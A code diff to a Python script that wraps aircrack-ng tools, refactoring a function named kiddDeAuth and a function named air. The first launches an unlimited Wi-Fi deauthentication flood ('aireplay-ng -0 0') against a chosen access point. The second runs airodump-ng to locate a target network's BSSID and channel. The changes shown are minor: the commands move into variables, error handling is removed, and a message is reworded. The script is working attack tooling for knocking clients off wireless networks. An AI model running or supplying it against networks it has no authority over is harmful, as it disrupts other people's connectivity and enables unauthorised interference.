@@ -84,7 +84,9 @@ def kiddDeAuth( BSSID, interface ):
 
         print( f"\n\n{ red }Program is roasting the fish!\n\n" )
 
-        p = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ] )
+        cmd = [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ]
+
+        p = subprocess.Popen( cmd )
 
         time.sleep( 20 )
 
@@ -120,17 +122,11 @@ def air( IF, ESSID ):
 
     dic = {}
 
-    try:
+    f = open( "wifiInterF.txt", "w" )
 
-        f = open( "wifiInterF.txt", "w" )
+    cmd = [ "sudo", "airodump-ng", "-i", IF ]
 
-    except:
-
-        print( f"\n\n{ red }Error : wifiInterF.txt file creation!\n\n" )
-
-        sys.exit( 0 )
-
-    p = subprocess.Popen( [ "sudo", "airodump-ng", "-i", IF ], stdout= f )
+    p = subprocess.Popen( cmd, stdout = f )
 
     print( "\n\n" )
 
@@ -166,7 +162,7 @@ def air( IF, ESSID ):
 
         if bssid == "" or chnel == "":
 
-            print( f"\n\n{ blue }Run the script in a full-screen terminal and ensure the correct ESSID.\n\n" )
+            print( f"\n\n{ yellow }1. Run the script in a full-screen terminal\n2. Ensure the correct ESSID\n3. Ensure your IF is in monitor mode.\n\n" )
 
             sys.exit( 0 )
 
